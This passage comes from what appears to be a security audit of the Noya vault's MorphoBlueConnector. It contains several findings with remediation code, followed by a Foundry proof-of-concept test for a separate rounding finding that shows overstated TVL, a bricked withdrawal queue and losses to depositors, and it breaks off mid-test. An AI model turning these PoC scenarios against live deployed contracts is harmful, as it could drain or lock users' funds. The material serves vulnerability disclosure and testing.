However, `MorphoBlueConnector.withdraw` (lines 58–73) omits this check when withdrawing collateral (`sOrC == false` at lines 62–64):

```solidity
if (sOrC) {
    morphoBlue.withdraw(params, amount, 0, address(this), address(this));
} else {
    morphoBlue.withdrawCollateral(params, amount, address(this), address(this));
}
```

When `morphoBlue.withdrawCollateral` is called while the connector has an active borrow position (`p.borrowShares > 0`), `p.collateral` decreases, which directly reduces the health factor computed by `getHealthFactor`:

$$\text{HealthFactor} = \frac{\text{market.lltv} \times \text{convertCToL}(p.\text{collateral}, \text{market.oracle}, \text{market.collateralToken})}{\text{borrowAmount}}$$

Because `MorphoBlueConnector.withdraw` relies solely on Morpho Blue's internal protocol solvency check (which only requires collateral value multiplied by `lltv` to cover `borrowAmount`, equivalent to a health factor of `1e18`), any collateral withdrawal that leaves the health factor in the range $[1\text{e}18, \text{minimumHealthFactor})$ succeeds in Morpho Blue and is not rejected by `MorphoBlueConnector`.

findings.remediation:
Enforce the `minimumHealthFactor` check in `MorphoBlueConnector.withdraw` after withdrawing collateral when `sOrC == false`:

```solidity
    function withdraw(uint256 amount, Id id, bool sOrC) external onlyManager nonReentrant {
        MarketParams memory params = morphoBlue.idToMarketParams(id);
        if (sOrC) {
            morphoBlue.withdraw(params, amount, 0, address(this), address(this));
        } else {
            morphoBlue.withdrawCollateral(params, amount, address(this), address(this));
            uint256 hf = getHealthFactor(id, morphoBlue.market(id));
            if (hf < minimumHealthFactor) {
                revert IConnector_LowHealthFactor(hf);
            }
        }
        Position memory p = morphoBlue.position(id, address(this));
        if (p.collateral == 0 && p.supplyShares == 0) {
            registry.updateHoldingPosition(
                vaultId, registry.calculatePositionId(address(this), MORPHO_POSITION_ID, abi.encode(id)), "", "", true
            );
        }
        _updateTokenInRegistry(params.collateralToken);
        emit Withdraw(amount, id, sOrC);
    }
```

findings.technical_details:
In `BaseConnector`, the state variable `minimumHealthFactor` (initialized to `MINIMUM_HEALTH_FACTOR = 15e17`, and configurable upwards by the maintainer via `updateMinimumHealthFactor`) defines the minimum allowable health factor for borrowing connectors so the vault maintains a safe buffer above the external protocol's liquidation threshold.

In `MorphoBlueConnector.borrow` (lines 80–88), the contract enforces this invariant after borrowing:
```solidity
if (getHealthFactor(id, morphoBlue.market(id)) < minimumHealthFactor) {
    revert IConnector_LowHealthFactor(getHealthFactor(id, morphoBlue.market(id)));
}
```
However, in `MorphoBlueConnector.withdraw` (lines 58–73), when `sOrC` is `false`, the contract calls `morphoBlue.withdrawCollateral(params, amount, address(this), address(this))` and completes execution at lines 70–73 without checking `getHealthFactor(id, morphoBlue.market(id)) < minimumHealthFactor`.

Because Morpho Blue's internal `_isHealthy` check only requires the position's borrow amount not to exceed `collateralQuoted * lltv` (which corresponds to a health factor of `1e18` in `getHealthFactor`), `withdraw` allows the manager/keeper to withdraw collateral until the health factor drops all the way to `1e18`, completely bypassing `minimumHealthFactor` (e.g., `1.5e18` or higher as configured by the maintainer).

findings.remediation:
Enforce the `minimumHealthFactor` check in `MorphoBlueConnector.withdraw` (when withdrawing collateral or at the end of `withdraw`), matching the check in `borrow`:

```solidity
    function withdraw(uint256 amount, Id id, bool sOrC) external onlyManager nonReentrant {
        MarketParams memory params = morphoBlue.idToMarketParams(id);
        if (sOrC) {
            morphoBlue.withdraw(params, amount, 0, address(this), address(this));
            _updateTokenInRegistry(params.loanToken);
        } else {
            morphoBlue.withdrawCollateral(params, amount, address(this), address(this));
            if (getHealthFactor(id, morphoBlue.market(id)) < minimumHealthFactor) {
                revert IConnector_LowHealthFactor(getHealthFactor(id, morphoBlue.market(id)));
            }
            _updateTokenInRegistry(params.collateralToken);
        }
        Position memory p = morphoBlue.position(id, address(this));
        if (p.collateral == 0 && p.supplyShares == 0) {
            registry.updateHoldingPosition(
                vaultId, registry.calculatePositionId(address(this), MORPHO_POSITION_ID, abi.encode(id)), "", "", true
            );
        }
        emit Withdraw(amount, id, sOrC);
    }
```

findings.technical_details:
`MorphoBlueConnector` interacts with Morpho Blue markets, each defined by `MarketParams` containing both a `loanToken` (used for supply and borrow) and a `collateralToken` (used for collateral).

In `MorphoBlueConnector.supply(uint256 amount, Id id, bool sOrC)` (lines 35–50), the `sOrC` boolean determines which asset is supplied and synchronized with `PositionRegistry`:
- When `sOrC == true`, `params.loanToken` is supplied via `morphoBlue.supply` and `_updateTokenInRegistry(params.loanToken)` is called (line 40). If the connector's entire `loanToken` balance was supplied, `_updateTokenInRegistry` removes the `loanToken` holding position (position type `0` calculated with `accountingManager`) from `PositionRegistry`.
- When `sOrC == false`, `params.collateralToken` is supplied via `morphoBlue.supplyCollateral` and `_updateTokenInRegistry(params.collateralToken)` is called (line 44).

However, in `MorphoBlueConnector.withdraw(uint256 amount, Id id, bool sOrC)` (lines 58–73):
```solidity
if (sOrC) {
    morphoBlue.withdraw(params, amount, 0, address(this), address(this));
} else {
    morphoBlue.withdrawCollateral(params, amount, address(this), address(this));
}
...
_updateTokenInRegistry(params.collateralToken);
```
When `sOrC == true`, `morphoBlue.withdraw` transfers `amount` of `params.loanToken` back to `MorphoBlueConnector`. Instead of updating `params.loanToken` in the registry, line 71 unconditionally calls `_updateTokenInRegistry(params.collateralToken)`.

Consequently, if the connector had a zero balance of `params.loanToken` prior to the withdrawal (and thus no active holding position for `params.loanToken` in `PositionRegistry`), the newly received `params.loanToken` balance is never registered as a holding position. Furthermore, if the withdrawal closes the Morpho supply position (such that `p.collateral == 0 && p.supplyShares == 0`), lines 66–70 remove the `MORPHO_POSITION_ID` holding position as well. The withdrawn `loanToken` funds sit idle in `MorphoBlueConnector` without any corresponding entry in `vaults[vaultId].holdingPositions`, causing the vault's TVL calculation to completely omit those tokens.

findings.remediation:
Update the token in `PositionRegistry` based on the `sOrC` flag so that `params.loanToken` is updated when withdrawing supplied loan tokens and `params.collateralToken` is updated when withdrawing collateral.

```solidity
    function withdraw(uint256 amount, Id id, bool sOrC) external onlyManager nonReentrant {
        MarketParams memory params = morphoBlue.idToMarketParams(id);
        if (sOrC) {
            morphoBlue.withdraw(params, amount, 0, address(this), address(this));
        } else {
            morphoBlue.withdrawCollateral(params, amount, address(this), address(this));
        }
        Position memory p = morphoBlue.position(id, address(this));
        if (p.collateral == 0 && p.supplyShares == 0) {
            registry.updateHoldingPosition(
                vaultId, registry.calculatePositionId(address(this), MORPHO_POSITION_ID, abi.encode(id)), "", "", true
            );
        }
        _updateTokenInRegistry(sOrC ? params.loanToken : params.collateralToken);
        emit Withdraw(amount, id, sOrC);
    }
```

findings.proof_of_concept:
Test file (fork-free; Morpho Blue is represented by a local mock that reproduces Morpho's rounding rules using the repository's own `SharesMathLib` — supply mints `toSharesDown`, withdraw burns `toSharesUp` / pays `toAssetsDown`. Everything on the Noya side — registry, oracle, `AccountingManager` deposit/withdraw queues, `MorphoBlueConnector` — is the audited code under test):

```solidity
// SPDX-License-Identifier: Apache-2.0
pragma solidity 0.8.20;

import "./utils/testStarter.sol";
import {
    MorphoBlueConnector,
    BaseConnectorCP,
    Id,
    Market,
    IMorpho,
    MarketParams,
    Position
} from "contracts/connectors/MorphoBlueConnector.sol";
import { SharesMathLib } from "contracts/external/libraries/Morpho/SharesMathLib.sol";
import { MathLib, WAD } from "contracts/external/libraries/Morpho/MathLib.sol";
import { ERC20 } from "@openzeppelin/contracts-5.0/token/ERC20/ERC20.sol";
import { RetrieveData, WithdrawRequest } from "contracts/interface/Accounting/IAccountingManager.sol";

/**
 * @dev Local stand-ins so the PoC runs fork-free. MorphoBlueLocalMock reimplements the subset of
 * Morpho Blue used by MorphoBlueConnector with Morpho's own rounding rules (repo's SharesMathLib):
 * supply mints toSharesDown, withdraw burns toSharesUp / pays out toAssetsDown. That asymmetry is
 * the crux of the finding.
 */
contract MockERC20 is ERC20 {
    uint8 private immutable _decimals;

    constructor(string memory n, string memory s, uint8 d) ERC20(n, s) {
        _decimals = d;
    }

    function decimals() public view override returns (uint8) {
        return _decimals;
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract MorphoOracleMock {
    uint256 public immutable mockPrice;

    constructor(uint256 p) {
        mockPrice = p;
    }

    function price() external view returns (uint256) {
        return mockPrice;
    }
}

/// @dev Same simple model as testFoundry/utils/mocks/IrmMock.sol (x% utilization == x% APR),
/// @dev typed against the connector's own MarketParams/Market definitions.
contract LocalIrm {
    using MathLib for uint256;

    function borrowRateView(MarketParams memory, Market memory market) public pure returns (uint256) {
        if (market.totalSupplyAssets == 0) return 0;
        uint256 utilization = uint256(market.totalBorrowAssets).wDivDown(uint256(market.totalSupplyAssets));
        return utilization / 365 days;
    }

    function borrowRate(MarketParams memory mp, Market memory market) external view returns (uint256) {
        return borrowRateView(mp, market);
    }
}

contract MorphoBlueLocalMock {
    using MathLib for uint256;
    using SharesMathLib for uint256;

    uint256 public constant ORACLE_PRICE_SCALE = 1e36;

    address public immutable morphoOwner;
    mapping(address => bool) public isIrmEnabled;
    mapping(uint256 => bool) public isLltvEnabled;

    mapping(Id => MarketParams) private paramsOf;
    mapping(Id => Market) private marketOf;
    mapping(Id => mapping(address => Position)) private positionOf;

    constructor() {
        morphoOwner = msg.sender;
    }

    uint256 internal constant MARKET_PARAMS_BYTES_LENGTH = 5 * 32;

    function idOf(MarketParams memory marketParams) internal pure returns (Id marketParamsId) {
        assembly ("memory-safe") {
            marketParamsId := keccak256(marketParams, MARKET_PARAMS_BYTES_LENGTH)
        }
    }

    function enableIrm(address irm) external {
        require(msg.sender == morphoOwner, "MorphoMock: auth");
        isIrmEnabled[irm] = true;
    }

    function enableLltv(uint256 lltv) external {
        require(msg.sender == morphoOwner, "MorphoMock: auth");
        isLltvEnabled[lltv] = true;
    }

    function createMarket(MarketParams memory mp) external {
        Id id_ = idOf(mp);
        require(marketOf[id_].lastUpdate == 0, "MorphoMock: market exists");
        require(isIrmEnabled[mp.irm], "MorphoMock: irm not enabled");
        require(isLltvEnabled[mp.lltv] && mp.lltv != 0, "MorphoMock: lltv not enabled");
        require(mp.loanToken != address(0) && mp.collateralToken != address(0) && mp.oracle != address(0), "MorphoMock: zero address");
        paramsOf[id_] = mp;
        marketOf[id_] = Market(0, 0, 0, 0, uint128(block.timestamp), 0);
    }

    function idToMarketParams(Id id_) external view returns (MarketParams memory) {
        return paramsOf[id_];
    }

    function market(Id id_) external view returns (Market memory) {
        return marketOf[id_];
    }

    function position(Id id_, address user) external view returns (Position memory) {
        return positionOf[id_][user];
    }

    function _accrueInterest(Id id_) internal {
        Market storage m = marketOf[id_];
        uint256 elapsed = block.timestamp - m.lastUpdate;
        if (elapsed > 0) {
            m.lastUpdate = uint128(block.timestamp);
            if (m.totalBorrowAssets > 0) {
                MarketParams memory mp = paramsOf[id_];
                Market memory memMarket = m;
                uint256 borrowRate = LocalIrm(mp.irm).borrowRate(mp, memMarket);
                uint256 interest = MathLib.wTaylorCompounded(borrowRate, elapsed);
                uint256 interestAssets = MathLib.mulDivUp(interest, m.totalBorrowAssets, WAD);
                m.totalBorrowAssets += uint128(interestAssets);
                m.totalSupplyAssets += uint128(interestAssets);
                // fee == 0 on this market, no fee shares are minted
            }
        }
    }

    function accrueInterest(MarketParams memory mp) public {
        Id id_ = idOf(mp);
        require(marketOf[id_].lastUpdate != 0, "MorphoMock: market not created");
        _accrueInterest(id_);
    }

    function supply(MarketParams memory mp, uint256 assets, uint256 shares, address onBehalf, bytes memory)
        external
        returns (uint256, uint256)
    {
        Id id_ = idOf(mp);
        Market storage m = marketOf[id_];
        require(assets != 0 || shares != 0, "MorphoMock: zero supply");
        _accrueInterest(id_);
        if (assets > 0) {
            shares = assets.toSharesDown(m.totalSupplyAssets, m.totalSupplyShares);
        } else {
            assets = shares.toAssetsUp(m.totalSupplyAssets, m.totalSupplyShares);
        }
        positionOf[id_][onBehalf].supplyShares += uint128(shares);
        m.totalSupplyShares += uint128(shares);
        m.totalSupplyAssets += uint128(assets);
        ERC20(mp.loanToken).transferFrom(msg.sender, address(this), assets);
        return (assets, shares);
    }

    function withdraw(MarketParams memory mp, uint256 assets, uint256 shares, address onBehalf, address receiver)
        external
        returns (uint256, uint256)
    {
        Id id_ = idOf(mp);
        Market storage m = marketOf[id_];
        require(assets != 0 || shares != 0, "MorphoMock: zero withdraw");
        _accrueInterest(id_);
        if (assets > 0) {
            shares = assets.toSharesUp(m.totalSupplyAssets, m.totalSupplyShares);
        } else {
            assets = shares.toAssetsDown(m.totalSupplyAssets, m.totalSupplyShares);
        }
        Position storage p = positionOf[id_][onBehalf];
        require(shares <= p.supplyShares, "MorphoMock: burn exceeds supply shares");
        p.supplyShares -= uint128(shares);
        m.totalSupplyShares -= uint128(shares);
        m.totalSupplyAssets -= uint128(assets);
        require(m.totalSupplyAssets >= m.totalBorrowAssets, "MorphoMock: not enough liquidity");
        ERC20(mp.loanToken).transfer(receiver, assets);
        return (assets, shares);
    }

    function supplyCollateral(MarketParams memory mp, uint256 assets, address onBehalf, bytes memory) external {
        Id id_ = idOf(mp);
        require(assets != 0, "MorphoMock: zero collateral");
        positionOf[id_][onBehalf].collateral += uint128(assets);
        ERC20(mp.collateralToken).transferFrom(msg.sender, address(this), assets);
    }

    function withdrawCollateral(MarketParams memory mp, uint256 assets, address onBehalf, address receiver) external {
        Id id_ = idOf(mp);
        require(assets != 0, "MorphoMock: zero collateral");
        Position storage p = positionOf[id_][onBehalf];
        require(assets <= p.collateral, "MorphoMock: collateral underflow");
        p.collateral -= uint128(assets);
        ERC20(mp.collateralToken).transfer(receiver, assets);
    }

    function borrow(MarketParams memory mp, uint256 assets, uint256 shares, address onBehalf, address receiver)
        external
        returns (uint256, uint256)
    {
        Id id_ = idOf(mp);
        Market storage m = marketOf[id_];
        require(assets != 0 || shares != 0, "MorphoMock: zero borrow");
        _accrueInterest(id_);
        if (assets > 0) {
            shares = assets.toSharesDown(m.totalBorrowAssets, m.totalBorrowShares);
        } else {
            assets = shares.toAssetsUp(m.totalBorrowAssets, m.totalBorrowShares);
        }
        Position storage p = positionOf[id_][onBehalf];
        p.borrowShares += uint128(shares);
        m.totalBorrowShares += uint128(shares);
        m.totalBorrowAssets += uint128(assets);
        m.totalSupplyAssets -= uint128(assets);
        require(m.totalSupplyAssets >= m.totalBorrowAssets, "MorphoMock: not enough liquidity");
            uint256 maxBorrow =
                uint256(p.collateral).mulDivDown(MorphoOracleMock(mp.oracle).price(), ORACLE_PRICE_SCALE).wMulDown(mp.lltv);
        uint256 borrowAssets = uint256(m.totalBorrowShares).toAssetsUp(m.totalBorrowAssets, m.totalBorrowShares);
        require(maxBorrow >= borrowAssets, "MorphoMock: unhealthy");
        ERC20(mp.loanToken).transfer(receiver, assets);
        return (assets, shares);
    }

    function repay(MarketParams memory mp, uint256 assets, uint256 shares, address onBehalf, bytes memory)
        external
        returns (uint256, uint256)
    {
        Id id_ = idOf(mp);
        Market storage m = marketOf[id_];
        require(assets != 0 || shares != 0, "MorphoMock: zero repay");
        _accrueInterest(id_);
        if (assets > 0) {
            shares = assets.toSharesDown(m.totalBorrowAssets, m.totalBorrowShares);
        } else {
            assets = shares.toAssetsUp(m.totalBorrowAssets, m.totalBorrowShares);
        }
        Position storage p = positionOf[id_][onBehalf];
        require(shares <= p.borrowShares, "MorphoMock: repay exceeds borrow shares");
        p.borrowShares -= uint128(shares);
        m.totalBorrowShares -= uint128(shares);
        m.totalBorrowAssets -= uint128(assets);
        ERC20(mp.loanToken).transferFrom(msg.sender, address(this), assets);
        return (assets, shares);
    }
}

/**
 * Finding 7 (2024-04-noya H-19): MorphoBlueConnector._getPositionTVL converts pos.supplyShares with
 * toAssetsUp instead of toAssetsDown, so the reported position/TVL value exceeds what Morpho Blue
 * lets the connector actually withdraw.
 *
 * All market state is reached through public entry points only (deposits, collateral supply,
 * borrowing, one year of interest accrual, vault supply through connector.supply). No forks, no
 * vm.store.
 */
contract PoC_2024_04_noya__H_19_f7 is testStarter {
    using SharesMathLib for uint256;

    MorphoBlueConnector internal connector;
    MorphoBlueLocalMock internal morpho;
    LocalIrm internal irm;
    MorphoOracleMock internal mOracle;
    MockERC20 internal loan; // 6 decimals, also the vault base token
    MockERC20 internal coll; // 18 decimals

    MarketParams internal marketA; // trigger market: interest-accrued (irregular share price)
    MarketParams internal marketB; // control market: pristine (exact 1e6 shares/asset price)
    MarketParams internal marketC; // second trigger market for the multi-position case
    Id internal idA;
    Id internal idB;
    Id internal idC;

    address internal lp = makeAddr("lp");
    address internal borrower = makeAddr("borrower");
    address internal funder = makeAddr("funder");

    uint256 internal constant LLTV_A = 860_000_000_000_000_000;
    uint256 internal constant LLTV_B = 800_000_000_000_000_000;
    uint256 internal constant LLTV_C = 700_000_000_000_000_000;

    function setUp() public {
        loan = new MockERC20("Loan USDC", "USDC", 6);
        coll = new MockERC20("Collateral DAI", "DAI", 18);

        vm.startPrank(owner);
        deployEverythingNormal(address(loan));

        morpho = new MorphoBlueLocalMock();
        irm = new LocalIrm();
        mOracle = new MorphoOracleMock(1e24); // 1:1 price, 18-dec collateral -> 6-dec loan

        connector =
            new MorphoBlueConnector(address(morpho), BaseConnectorCP(registry, vaultId, swapHandler, noyaOracle));

        addConnectorToRegistry(vaultId, address(connector));
        addTrustedTokens(vaultId, address(accountingManager), address(loan));
        addTrustedTokens(vaultId, address(accountingManager), address(coll));

        morpho.enableIrm(address(irm));
        morpho.enableLltv(LLTV_A);
        morpho.enableLltv(LLTV_B);
        morpho.enableLltv(LLTV_C);

        marketA = MarketParams(address(loan), address(coll), address(mOracle), address(irm), LLTV_A);
        marketB = MarketParams(address(loan), address(coll), address(mOracle), address(irm), LLTV_B);
        marketC = MarketParams(address(loan), address(coll), address(mOracle), address(irm), LLTV_C);
        morpho.createMarket(marketA);
        morpho.createMarket(marketB);
        morpho.createMarket(marketC);
        idA = idOf(marketA);
        idB = idOf(marketB);
        idC = idOf(marketC);

        registry.addTrustedPosition(
            vaultId, connector.MORPHO_POSITION_ID(), address(connector), true, false, abi.encode(idA), ""
        );
        registry.addTrustedPosition(
            vaultId, connector.MORPHO_POSITION_ID(), address(connector), true, false, abi.encode(idB), ""
        );
        registry.addTrustedPosition(
            vaultId, connector.MORPHO_POSITION_ID(), address(connector), true, false, abi.encode(idC), ""
        );
        registry.addTrustedPosition(vaultId, 0, address(accountingManager), false, false, abi.encode(address(loan)), "");
        registry.addTrustedPosition(vaultId, 0, address(accountingManager), false, false, abi.encode(address(coll)), "");
        vm.stopPrank();
    }

    uint256 internal constant MARKET_PARAMS_BYTES_LENGTH = 5 * 32;

    function idOf(MarketParams memory marketParams) internal pure returns (Id marketParamsId) {
        assembly ("memory-safe") {
            marketParamsId := keccak256(marketParams, MARKET_PARAMS_BYTES_LENGTH)
        }
    }

    // ------------- helpers (public entry points only) -------------

    function _seedMarket(MarketParams memory mp) internal {
        loan.mint(lp, 2_000e6);
        vm.startPrank(lp);
        loan.approve(address(morpho), type(uint256).max);
        morpho.supply(mp, 2_000e6, 0, lp, "");
        vm.stopPrank();

        coll.mint(borrower, 2_000e18);
        vm.startPrank(borrower);
        coll.approve(address(morpho), type(uint256).max);
        morpho.supplyCollateral(mp, 1_500e18, borrower, "");
        morpho.borrow(mp, 500e6, 0, borrower, borrower);
        vm.stopPrank();
    }

    function _fundConnector(uint256 amount) internal {
        loan.mint(funder, amount);
        vm.startPrank(funder);
        loan.transfer(address(connector), amount);
        vm.stopPrank();
    }

    function _supplyValueUp(Id id_) internal view returns (uint256) {
        Position memory pos = morpho.position(id_, address(connector));
        Market memory m = morpho.market(id_);
        return pos.supplyShares.toAssetsUp(m.totalSupplyAssets, m.totalSupplyShares);
    }

    function _supplyValueDown(Id id_) internal view returns (uint256) {
        Position memory pos = morpho.position(id_, address(connector));
        Market memory m = morpho.market(id_);
        return pos.supplyShares.toAssetsDown(m.totalSupplyAssets, m.totalSupplyShares);
    }

    // ------------- PoC: single supply position -------------

    function test_poc_overstatedTVL_singlePosition() public {
        // 1. Realistic market state: liquidity, a collateralised borrower, one year of interest.
        _seedMarket(marketA);
        vm.warp(block.timestamp + 365 days);
        morpho.accrueInterest(marketA);

        // 2. The vault supplies 100 USDC through the audited connector.
        _fundConnector(100e6);
        vm.prank(owner);
        connector.supply(100e6, idA, true);

        Position memory pos = morpho.position(idA, address(connector));
        Market memory m = morpho.market(idA);

        // Trigger precondition from the finding: conversion divides inexactly.
        assertTrue(
            (pos.supplyShares * (uint256(m.totalSupplyAssets) + SharesMathLib.VIRTUAL_ASSETS))
                % (uint256(m.totalSupplyShares) + SharesMathLib.VIRTUAL_SHARES) != 0,
            "division exact - trigger absent"
        );

        uint256 up = _supplyValueUp(idA);
        uint256 down = _supplyValueDown(idA);
        assertEq(up - down, 1, "rounding gap must be exactly 1 wei");

        // 3. What AccountingManager reports as the vault TVL (loan token is the base token).
        uint256 tvl = accountingManager.TVL();
        assertEq(tvl, up, "accounting TVL equals the up-rounded supply value");

        // 4. Ground truth: the reported TVL cannot be withdrawn through the connector.
        vm.prank(owner);
        vm.expectRevert("MorphoMock: burn exceeds supply shares");
        connector.withdraw(tvl, idA, true);

        // 5. The maximum actually withdrawable is one wei less; measure it by really withdrawing.
        vm.prank(owner);
        connector.withdraw(tvl - 1, idA, true);
        uint256 received = loan.balanceOf(address(connector));
        assertEq(received, tvl - 1, "withdrawable amount is tvl - 1");
        assertEq(tvl - received, 1, "overstatement is 1 wei");

        console.log("reported TVL (toAssetsUp):", tvl);
        console.log("max withdrawable        :", received);
        console.log("overstatement (wei)     :", tvl - received);
    }

    // ------------- PoC: overstatement is per-position and sums -------------

    function test_poc_overstatedTVL_twoPositions() public {
        _seedMarket(marketA);
        _seedMarket(marketC);
        vm.warp(block.timestamp + 365 days);
        morpho.accrueInterest(marketA);
        morpho.accrueInterest(marketC);

        _fundConnector(200e6);
        vm.startPrank(owner);
        connector.supply(100e6, idA, true);
        connector.supply(100e6, idC, true);
        vm.stopPrank();

        uint256 tvl = accountingManager.TVL();
        uint256 withdrawable = _supplyValueDown(idA) + _supplyValueDown(idC);
        assertEq(tvl, _supplyValueUp(idA) + _supplyValueUp(idC), "TVL is the sum of up-rounded positions");

        // Empty both positions through the connector and count what actually comes out.
        vm.startPrank(owner);
        connector.withdraw(_supplyValueUp(idA) - 1, idA, true);
        connector.withdraw(_supplyValueUp(idC) - 1, idC, true);
        vm.stopPrank();
        uint256 received = loan.balanceOf(address(connector));
        assertEq(received, withdrawable, "received == sum of down-rounded values");
        assertEq(tvl - received, 2, "overstatement is 1 wei per supply position");

        console.log("reported TVL (2 positions):", tvl);
        console.log("max withdrawable          :", received);
        console.log("overstatement (wei)       :", tvl - received);
    }

    // ------------- R3 negative control: trigger absent, no overstatement -------------

    function test_control_exactDivision_noOverstatement() public {
        // Pristine market: no borrower, no interest, share price is exactly 1e6 shares per asset,
        // so toAssetsUp == toAssetsDown for the connector's shares.
        _fundConnector(100e6);
        vm.prank(owner);
        connector.supply(100e6, idB, true);

        Position memory pos = morpho.position(idB, address(connector));
        Market memory m = morpho.market(idB);
        assertEq(
            (pos.supplyShares * (uint256(m.totalSupplyAssets) + SharesMathLib.VIRTUAL_ASSETS))
                % (uint256(m.totalSupplyShares) + SharesMathLib.VIRTUAL_SHARES),
            0,
            "division should be exact in the control case"
        );
        assertEq(_supplyValueUp(idB), _supplyValueDown(idB), "up == down when division is exact");

        uint256 tvl = accountingManager.TVL();
        assertEq(tvl, 100e6, "TVL equals the supplied amount");

        // The full reported TVL IS withdrawable when the rounding trigger is absent.
        vm.prank(owner);
        connector.withdraw(tvl, idB, true);
        assertEq(loan.balanceOf(address(connector)), tvl, "full TVL withdrawn, no gap");
    }

    // =====================================================================
    // Escalated scenarios: the same 1-wei up-rounding, driven through the
    // REAL AccountingManager deposit/withdraw queues, so the loss lands on
    // named users instead of only misreporting an internal number.
    //
    // Loss classes proven below, none of which the base PoC shows:
    //   E1: the LAST redeemer's full withdrawal is permanently unfulfillable
    //       (withdraw group bricked vault-wide; the redeemer's shares are
    //       locked by the pending request).
    //   E2: the FIRST redeemer is overpaid out of the remaining depositors'
    //       principal (measured against the counterfactual honest-TVL flow).
    //   E3: negative control - identical user flow on a trigger-free market
    //       pays everyone in full and bricks nothing.
    // =====================================================================

    function _freezeQueueWaitingTimes() internal {
        vm.startPrank(owner);
        accountingManager.changeDepositWaitingTime(0);
        accountingManager.changeWithdrawWaitingTime(0);
        vm.stopPrank();
    }

    /// @dev Full user deposit flow through the vault's own entry points:
    /// deposit -> calculateDepositShares -> executeDeposit (funds land on the
    /// connector, like a keeper-driven vault would).
    function _userDeposit(address user, uint256 amount) internal {
        loan.mint(user, amount);
        vm.startPrank(user);
        loan.approve(address(accountingManager), type(uint256).max);
        accountingManager.deposit(user, amount, address(0));
        vm.stopPrank();
        vm.startPrank(owner);
        accountingManager.calculateDepositShares(10);
        accountingManager.executeDeposit(10, address(connector), "");
        vm.stopPrank();
    }

    // ------------- E1: last redeemer bricked, principal above the dust trapped -------------

    function test_poc_escalated_lastRedeemerBricked() public {
        _freezeQueueWaitingTimes();
        _seedMarket(marketA);
        vm.warp(block.timestamp + 365 days);
        morpho.accrueInterest(marketA);

        // A single depositor runs the full deposit flow; the keeper then puts
        // 100% of vault assets into the (interest-accrued) Morpho market.
        _userDeposit(alice, 100e6);
        assertEq(accountingManager.balanceOf(alice), 100e6, "1:1 shares while the vault is empty");

        vm.prank(owner);
        connector.supply(100e6, idA, true);

        uint256 tvlReported = accountingManager.TVL();
        uint256 realizable = _supplyValueDown(idA);
        assertEq(tvlReported, _supplyValueUp(idA), "TVL is the up-rounded supply value");
        assertEq(tvlReported - realizable, 1, "trigger: TVL overstates realizable by 1 wei");

        // Alice asks for a full redemption through the real withdraw queue.
        vm.prank(alice);
        accountingManager.withdraw(100e6, alice);
        vm.prank(owner);
        accountingManager.calculateWithdrawShares(10);

        uint256[] memory idx = new uint256[](1);
        idx[0] = 0;
        (, WithdrawRequest[] memory wq) = accountingManager.getQueueItems(false, idx);
        uint256 promised = wq[0].amount;
        assertEq(promised, tvlReported, "the queue promises the full overstated TVL");
        assertGt(promised, realizable, "promise exceeds everything Morpho will ever release");

        vm.startPrank(owner);
        accountingManager.startCurrentWithdrawGroup();
        assertEq(accountingManager.neededAssetsForWithdraw(), promised, "group needs the promised amount");

        // The keeper cannot fund the group: Morpho refuses the last wei.
        vm.expectRevert("MorphoMock: burn exceeds supply shares");
        connector.withdraw(promised, idA, true);

        // Funding everything that actually exists is still not enough.
        connector.withdraw(realizable, idA, true);
        RetrieveData[] memory rd = new RetrieveData[](1);
        rd[0] = RetrieveData(promised, address(connector), abi.encode(promised, ""));
        vm.expectRevert(); // connector only holds `realizable` base tokens
        accountingManager.retrieveTokensForWithdraw(rd);
        rd[0] = RetrieveData(realizable, address(connector), abi.encode(realizable, ""));
        accountingManager.retrieveTokensForWithdraw(rd);
        vm.expectRevert(); // amountAskedForWithdraw != totalCBAmount
        accountingManager.fulfillCurrentWithdrawGroup();
        vm.expectRevert(); // group can never be fulfilled
        accountingManager.executeWithdraw(10);
        vm.expectRevert(); // even the manager cannot reset the queue mid-group
        accountingManager.resetMiddle(0, false);
        vm.stopPrank();

        // Alice's shares are locked by the eternally-pending request.
        vm.prank(alice);
        vm.expectRevert();
        accountingManager.transfer(bob, 1);

        // And the active group bricks withdrawals for every other user too.
        _userDeposit(bob, 100e6);
        vm.prank(bob);
        accountingManager.withdraw(1e6, bob);
        vm.prank(owner);
        vm.expectRevert(); // NoyaAccounting_ThereIsAnActiveWithdrawGroup
        accountingManager.calculateWithdrawShares(10);

        console.log("promised to last redeemer :", promised);
        console.log("actually realizable        :", realizable);
        console.log("trapped principal (wei)    :", promised - realizable);
    }

    // ------------- E2: first redeemer is overpaid from remaining depositors' principal -------------

    function test_poc_escalated_firstRedeemerTakesLastWei() public {
        _freezeQueueWaitingTimes();
        _seedMarket(marketA);
        vm.warp(block.timestamp + 365 days);
        morpho.accrueInterest(marketA);

        // Two depositors with identical positions.
        _userDeposit(alice, 100e6);
        _userDeposit(bob, 100e6);
        assertEq(accountingManager.balanceOf(alice), 100e6);
        assertEq(accountingManager.balanceOf(bob), 100e6);

        vm.startPrank(owner);
        connector.supply(200e6, idA, true);
        vm.stopPrank();

        uint256 tvlReported = accountingManager.TVL();
        uint256 realizable = _supplyValueDown(idA);
        assertEq(tvlReported, _supplyValueUp(idA), "TVL is the up-rounded supply value");
        assertEq(tvlReported - realizable, 1, "trigger present");
        assertEq(tvlReported, 200e6, "vault supplied exactly 200e6");

        // Counterfactual: shares the first redeemer would get if TVL used the
        // honest down-rounded value (same OZ floor math, no source change).
        uint256 fairFirst = (100e6 * (realizable + 1)) / (200e6 + 1);

        // The first redeemer exits fully through the queue.
        vm.prank(alice);
        accountingManager.withdraw(100e6, alice);
        vm.startPrank(owner);
        accountingManager.calculateWithdrawShares(10);
        accountingManager.startCurrentWithdrawGroup();
        connector.withdraw(100e6, idA, true);
        RetrieveData[] memory rd = new RetrieveData[](1);
        rd[0] = RetrieveData(100e6, address(connector), abi.encode(100e6, ""));
        accountingManager.retrieveTokensForWithdraw(rd);
        accountingManager.fulfillCurrentWithdrawGroup();
        accountingManager.executeWithdraw(10);
        vm.stopPrank();

        uint256 aliceGot = loan.balanceOf(alice);
        assertEq(aliceGot, 100e6, "first redeemer is paid in full");
        assertGt(aliceGot, fairFirst, "she is paid MORE than her fair share of realizable assets");

        // The remaining depositor holds an identical position but is now short.
        uint256 victimRealizable = _supplyValueDown(idA);
        uint256 victimPromised = accountingManager.previewRedeem(100e6);
        assertEq(victimRealizable, aliceGot - 1, "identical deposit is now worth 1 wei less");
        assertGt(victimPromised, victimRealizable, "victim's full redemption is unfulfillable");

        // And it really is unfulfillable: the keeper cannot fund it.
        vm.prank(bob);
